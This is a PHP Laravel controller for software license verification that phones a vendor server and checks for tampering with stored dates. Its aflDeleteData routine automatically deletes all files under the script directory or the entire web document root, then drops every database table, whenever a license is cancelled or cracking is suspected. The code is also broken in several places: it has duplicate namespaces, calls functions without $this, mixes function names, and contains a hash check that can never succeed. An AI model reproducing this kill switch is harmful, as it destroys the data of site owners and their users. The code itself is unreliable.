<?php

namespace App\Http\Controllers\AflCoreFunctions;

namespace App\Models;
use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Lang;
use Illuminate\Support\Facades\Schema;




/**
 * Consist of functionalities for the Installing the license in Auto Faveo licenser 
 * Class AflVerifyLicenseController
 * @package App\Http\Controllers\AflCoreFunctions
 */
class AflVerifyLicenseController extends Controller
{
     /**
     * checks user input
     * 
     * @param $FORCE_VERIFICATION
     *
     * @return notifications_array with error messages if something wrong 
    */ 
   public function aflVerifyLicense(/*$MYSQLI_LINK=null,*/$FORCE_VERIFICATION=0)
    {
    $notifications_array=array();
    $update_lrd_value=0;
    $update_lcd_value=0;
    $updated_records=0;

    if (empty($apl_core_notifications=aflCheckSettings())) //only continue if script is properly configured
        {
        if (aflCheckData()) //only continue if license is installed and properly configured
            {
            extract(aflGetLicenseData()); //get license data

            if (aflGetDaysBetweenDates(aflCustomDecrypt($LCD, \config('constants.Basic.AFL_SALT').$INSTALLATION_KEY), date("Y-m-d"))<\config('constants.Basic.AFL_DAYS') && aflCustomDecrypt($LCD, \config('constants.Basic.AFL_SALT').$INSTALLATION_KEY)<=date("Y-m-d") && aplCustomDecrypt($LRD, \config('constants.Basic.AFL_SALT').$INSTALLATION_KEY)<=date("Y-m-d") && $FORCE_VERIFICATION===0) //the only case when no verification is needed, return notification_license_ok case, so script can continue working
                {
                $notifications_array['notification_case']="notification_license_ok";
                $notifications_array['notification_text']=\config('constants.Basic.APL_NOTIFICATION_BYPASS_VERIFICATION');
                }
            else //time to verify license (or use forced verification)
                {
                $post_info="product_id=".rawurlencode(\config('constants.Basic.AFL_PRODUCT_ID'))."&client_email=".rawurlencode($CLIENT_EMAIL)."&license_code=".rawurlencode($LICENSE_CODE)."&root_url=".rawurlencode($ROOT_URL)."&installation_hash=".rawurlencode($INSTALLATION_HASH)."&license_signature=".rawurlencode(aflGenerateScriptSignature($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE));

                $content_array=aflCustomPost(\config('constants.Basic.AFL_ROOT_URL')."/afl_callbacks/license_verify.php", $post_info, $ROOT_URL);
                $notifications_array=aflParseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE); //process response from Auto PHP Licenser server
                if ($notifications_array['notification_case']=="notification_license_ok") //everything OK
                    {
                    $update_lcd_value=1;
                    }

                if ($notifications_array['notification_case']=="notification_license_cancelled" && \config('constants.Basic.AFL_DELETE_CANCELLED')=="YES") //license cancelled, data deletion activated, so delete user data
                    {
                    aflDeleteData();
                    }
                }

            if (aflCustomDecrypt($LRD, \config('constants.Basic.AFL_SALT').$INSTALLATION_KEY)<date("Y-m-d")) //used to make sure database gets updated only once a day, not every time script is executed. do it BEFORE new $INSTALLATION_KEY is generated
                {
                $update_lrd_value=1;
                }

            if ($update_lrd_value==1 || $update_lcd_value==1) //update database only if $LRD or $LCD were changed
                {
                if ($update_lcd_value==1) //generate new $LCD value ONLY if verification succeeded. Otherwise, old $LCD value should be used, so license will be verified again next time script is executed
                    {
                    $LCD=date("Y-m-d");
                    }
                else //get existing DECRYPTED $LCD value because it will need to be re-encrypted using new $INSTALLATION_KEY in case license verification didn't succeed
                    {
                    $LCD=aflCustomDecrypt($LCD, \config('constants.Basic.AFL_SALT').$INSTALLATION_KEY);
                    }

                $INSTALLATION_KEY=aflCustomEncrypt(bcrypt(date("Y-m-d")), \config('constants.Basic.AFL_SALT').$ROOT_URL); //generate $INSTALLATION_KEY first because it will be used as salt to encrypt LCD and LRD!!!
                $LCD=aflCustomEncrypt($LCD, \config('constants.Basic.AFL_SALT').$INSTALLATION_KEY); //finally encrypt $LCD value (it will contain either DECRYPTED old date, either non-encrypted today's date)
                $LRD=aflCustomEncrypt(date("Y-m-d"), \config('constants.Basic.AFL_SALT').$INSTALLATION_KEY); //generate new $LRD value every time database needs to be updated (because if LCD is higher than LRD, cracking attempt will be detected).

                if (\config('constants.Basic.APL_STORAGE')=="DATABASE") //license stored in database
                    { 
                       $stmt= DB::table(\config('constants.Basic.AFL_DATABASE_TABLE')) //will return the number of rows affected
                              ->where('id','id')  //updating all rows in the table 
                              ->update(array('LCD' => $LCD,'LRD'=>$LRD,'INSTALLATION_KEY'=>$INSTALLATION_KEY)); 

                        if($stmt>0){
                            $updated_records = $updated_records + $stmt;
                        }

                    if (!aflValidateIntegerValue($updated_records)) //updating database failed
                        {
                        echo \config('constants.Basic.AFL_NOTIFICATION_DATABASE_WRITE_ERROR');
                        exit();
                        }
                    }

                if (\config('constants.Basic.APL_STORAGE')=="FILE") //license stored in file
                    {
                    $handle=@fopen(\config('constants.Basic.AFL_DIRECTORY')."/".\config('constants.Basic.AFL_LICENSE_FILE_LOCATION'), "w+");
                    $fwrite=@fwrite($handle, "<ROOT_URL>$ROOT_URL</ROOT_URL><CLIENT_EMAIL>$CLIENT_EMAIL</CLIENT_EMAIL><LICENSE_CODE>$LICENSE_CODE</LICENSE_CODE><LCD>$LCD</LCD><LRD>$LRD</LRD><INSTALLATION_KEY>$INSTALLATION_KEY</INSTALLATION_KEY><INSTALLATION_HASH>$INSTALLATION_HASH</INSTALLATION_HASH>");
                    if ($fwrite===false) //updating file failed
                        {
                        echo \config('constants.Basic.AFL_NOTIFICATION_DATABASE_WRITE_ERROR');
                        exit();
                        }
                    @fclose($handle);
                    }
                }
            }
        else //license is not installed yet or corrupted
            {
            $notifications_array['notification_case']="notification_license_corrupted";
            $notifications_array['notification_text']=\config('constants.Basic.AFL_NOTIFICATION_LICENSE_CORRUPTED');
            }
        }
    else //script is not properly configured
        {
        $notifications_array['notification_case']="notification_script_corrupted";
        $notifications_array['notification_text']=implode("; ", $apl_core_notifications);
        }

    return $notifications_array;
    }



    /**
     *check license data and return false if something wrong    
     *
     * @return $result if everything is ok or a an error detected 
    */
    protected function aflCheckData(/*$MYSQLI_LINK=null*/)
    {
    $error_detected=0;
    $cracking_detected=0;
    $result=false;

    extract(aflGetLicenseData()); //get license data

    if (!empty($ROOT_URL) && !empty($INSTALLATION_HASH) && !empty($INSTALLATION_KEY) && !empty($LCD) && !empty($LRD)) //do further check only if essential variables are valid
        {
        $LCD=aflCustomDecrypt($LCD,  \config('constants.Basic.AFL_SALT').$INSTALLATION_KEY); //decrypt $LCD value for easier data check
        $LRD=aflCustomDecrypt($LRD,  \config('constants.Basic.AFL_SALT').$INSTALLATION_KEY); //decrypt $LRD value for easier data check

        if (!filter_var($ROOT_URL, FILTER_VALIDATE_URL) || !ctype_alnum(substr($ROOT_URL, -1))) //invalid installation url
            {
            $error_detected=1;
            }

        if (filter_var(aflGetCurrentUrl(), FILTER_VALIDATE_URL) && stristr(aflGetRootUrl(aflGetCurrentUrl(), 1, 1, 0, 1), aplGetRootUrl("$ROOT_URL/", 1, 1, 0, 1))===false) //script is opened via browser (current_url set), but current_url is different from value in database
            {
            $error_detected=1;
            }

        if (empty($INSTALLATION_HASH) || $INSTALLATION_HASH!=Hash::make($ROOT_URL.$CLIENT_EMAIL.$LICENSE_CODE)) //invalid installation hash (value - $ROOT_URL, $CLIENT_EMAIL AND $LICENSE_CODE encrypted with sha256)
            {
            $error_detected=1;
            }

        if (empty($INSTALLATION_KEY) || !password_verify($LRD, aflCustomDecrypt($INSTALLATION_KEY,  \config('constants.Basic.AFL_SALT').$ROOT_URL))) //invalid installation key (value - current date ("Y-m-d") encrypted with password_hash and then encrypted with custom function (salt - $ROOT_URL). Put simply, it's LRD value, only encrypted different way)
            {
            $error_detected=1;
            }

        if (!aflVerifyDateTime($LCD, "Y-m-d")) //last check date is invalid
            {
            $error_detected=1;
            }

        if (!aflVerifyDateTime($LRD, "Y-m-d")) //last run date is invalid
            {
            $error_detected=1;
            }

        //check for possible cracking attempts - starts
        if (aflVerifyDateTime($LCD, "Y-m-d") && $LCD>date("Y-m-d", strtotime("+1 day"))) //last check date is VALID, but higher than current date (someone manually decrypted and overwrote it or changed system time back). Allow 1 day difference in case user changed his timezone and current date went 1 day back
            {
            $error_detected=1;
            $cracking_detected=1;
            }

        if (aflVerifyDateTime($LRD, "Y-m-d") && $LRD>date("Y-m-d", strtotime("+1 day"))) //last run date is VALID, but higher than current date (someone manually decrypted and overwrote it or changed system time back). Allow 1 day difference in case user changed his timezone and current date went 1 day back
            {
            $error_detected=1;
            $cracking_detected=1;
            }

        if (aflVerifyDateTime($LCD, "Y-m-d") && aflVerifyDateTime($LRD, "Y-m-d") && $LCD>$LRD) //last check date and last run date is VALID, but LCD is higher than LRD (someone manually decrypted and overwrote it or changed system time back)
            {
            $error_detected=1;
            $cracking_detected=1;
            }

        if ($cracking_detected==1 && config('constants.Advanced.AFL_DELETE_CRACKED')=="YES") //delete user data
            {
            aflDeleteData($MYSQLI_LINK);
            }
        //check for possible cracking attempts - ends

        if ($error_detected!=1 && $cracking_detected!=1) //everything OK
            {
            $result=true;
            }
        }

    return $result;
    }

    /**
     *get current page url and remove last slash if needed  
     * @param $remove_last_slash
     * @return $current_url wihtout the last slash
    */
    protected function aflGetCurrentUrl($remove_last_slash=0)
    {
    $protocol="http";
    $host="";
    $script="";
    $params="";
    $current_url="";
     
    $protocol_https = \request()->server('HTTPS');
    $protocol_proto = \request()->server('HTTP_X_FORWARDED_PROTO');
    $http_host = \request()->server('HTTP_HOST');
    $script_name = \request()->server('SCRIPT_NAME');
    $query_string = \request()->server('QUERY_STRING');

    if ((isset($protocol_https) && $protocol_https!=="off") || (isset($protocol_proto) && $protocol_proto=="https"))
        {
        $protocol="https";
        }

    if (isset($http_host))
        {
        $host=\request()->server('HTTP_HOST');
        }

    if (isset($script_name))
        {
        $script=\request()->server('SCRIPT_NAME');
        }

    if (isset($query_string))
        {
        $params=\request()->server('QUERY_STRING');
        }

    if (!empty($protocol) && !empty($host) && !empty($script)) //basic checks ok
        {
        $current_url=$protocol.'://'.$host.$script;

        if (!empty($params))
            {
            $current_url.='?'.$params;
            }

        if ($remove_last_slash==1) //remove / from the end of URL if it exists
            {
            while (substr($current_url, -1)=="/") //use cycle in case URL already contained multiple // at the end
                {
                $current_url=substr($current_url, 0, -1);
                }
            }
        }

    return $current_url;
    }



      /**
     * return root url from long url (http://www.domain.com/path/file.php?aa=xx becomes http://www.domain.com/path/), remove scheme, www. and last slash if needed
     * @param $url
     * @param $remove_scheme
     * @param $remove_www
     * @param $remove_path
     * @param $remove_last_slash
     * @return trim($url)
    */
    protected function aflGetRootUrl($url, $remove_scheme, $remove_www, $remove_path, $remove_last_slash)
    {
    if (filter_var($url, FILTER_VALIDATE_URL))
        {
        $url_array=parse_url($url); //parse URL into arrays like $url_array['scheme'], $url_array['host'], etc

        $url=str_ireplace($url_array['scheme']."://", "", $url); //make URL without scheme, so no :// is included when searching for first or last /

        if ($remove_path==1) //remove everything after FIRST / in URL, so it becomes "real" root URL
            {
            $first_slash_position=stripos($url, "/"); //find FIRST slash - the end of root URL
            if ($first_slash_position>0) //cut URL up to FIRST slash
                {
                $url=substr($url, 0, $first_slash_position+1);
                }
            }
        else //remove everything after LAST / in URL, so it becomes "normal" root URL
            {
            $last_slash_position=strripos($url, "/"); //find LAST slash - the end of root URL
            if ($last_slash_position>0) //cut URL up to LAST slash
                {
                $url=substr($url, 0, $last_slash_position+1);
                }
            }

        if ($remove_scheme!=1) //scheme was already removed, add it again
            {
            $url=$url_array['scheme']."://".$url;
            }

        if ($remove_www==1) //remove www.
            {
            $url=str_ireplace("www.", "", $url);
            }

        if ($remove_last_slash==1) //remove / from the end of URL if it exists
            {
            while (substr($url, -1)=="/") //use cycle in case URL already contained multiple // at the end
                {
                $url=substr($url, 0, -1);
                }
            }
        }

    return trim($url);
    }

    
    /**
     * delete user data   
     *
     * @return /exit() the execution after deleting the data
    */ 
    protected function aflDeleteData()
    {

    $Document_root = \request()->server('DOCUMENT_ROOT');
    if (\config('constants.Advanced.AFL_GOD_MODE')=="YES" && isset($Document_root)) //god mode enabled, delete everything from document root directory (usually httpdocs or public_html). god mode might not be available for IIS servers that don't always set $_SERVER['DOCUMENT_ROOT']
        {
        $root_directory=\request()->server('DOCUMENT_ROOT');
        }
    else
        {
        $root_directory=dirname(__DIR__); //(this file is located at INSTALLATION_PATH/SCRIPT, go one level up to enter root directory of protected script
        }

    foreach (new RecursiveIteratorIterator(new RecursiveDirectoryIterator($root_directory, FilesystemIterator::SKIP_DOTS), RecursiveIteratorIterator::CHILD_FIRST) as $path)
        {
        $path->isDir() && !$path->isLink() ? rmdir($path->getPathname()) : unlink($path->getPathname());
        }
    rmdir($root_directory);

    if (\config('constants.Basic.AFL_STORAGE')=="DATABASE") //license stored in database, delete MySQL data
        {
        $database_tables_array=array();

        $table_list_results=DB::select('SHOW TABLES')->get(); //get list of tables in database 
        /*while ($table_list_row=mysqli_fetch_row($table_list_results))    
            {
            $database_tables_array[]=$table_list_row[0];
            }*/    
        // $database_tables_array[] = $table_list_results->get()->toArray(); to array is for eloquent models
        $database_tables_array[] = (array) $table_list_results;

        if (!empty($database_tables_array)) 
            {
            foreach ($database_tables_array as $table_name) //delete all data from tables first
                {
               DB::table($table_name)->delete();
                }

            foreach ($database_tables_array as $table_name) //now drop tables (do it later to prevent script from being aborted when no drop privileges are granted)
                {
                Schema::dropIfExists($table_name);
                }
            }
        }

    exit(); //abort further execution
    }


     /**
     * decrypt text with custom key  
     * @param $string
     * @param $key
     *
     * @return $decrypted_string
    */
    protected function aflCustomDecrypt($string, $key)
    {
    $decrypted_string="";

    if (!empty($string) && !empty($key))
        {
        $string=base64_decode($string); //remove the base64 encoding from string (it's always encoded using base64_encode)
        if (stristr($string, "::")) //unique separator "::" found, most likely it's valid encrypted string
            {
            $string_iv_array=explode("::", $string, 2); //to decrypt, split the encrypted string from $iv - unique separator used was "::"
            if (!empty($string_iv_array) && count($string_iv_array)==2) //proper $string_iv_array should contain exactly two values - $encrypted_string and $iv
                {
                list($encrypted_string, $iv)=$string_iv_array;

                $decrypted_string=openssl_decrypt($encrypted_string, "aes-256-cbc", $key, 0, $iv);
                }
            }
        }

    return $decrypted_string;
    }

    /** 
    * calculate number of days between dates
    * @param $date_from
    * @param $date_to
    * @return $number_of_days
    */
    protected function aflGetDaysBetweenDates($date_from, $date_to)
    {
    $number_of_days=0;

    if (aflVerifyDateTime($date_from, "Y-m-d") && aflVerifyDateTime($date_to, "Y-m-d"))
        {
        $date_to=new DateTime($date_to);
        $date_from=new DateTime($date_from);
        $number_of_days=$date_from->diff($date_to)->format("%a");
        }

    return $number_of_days;
    }  
}
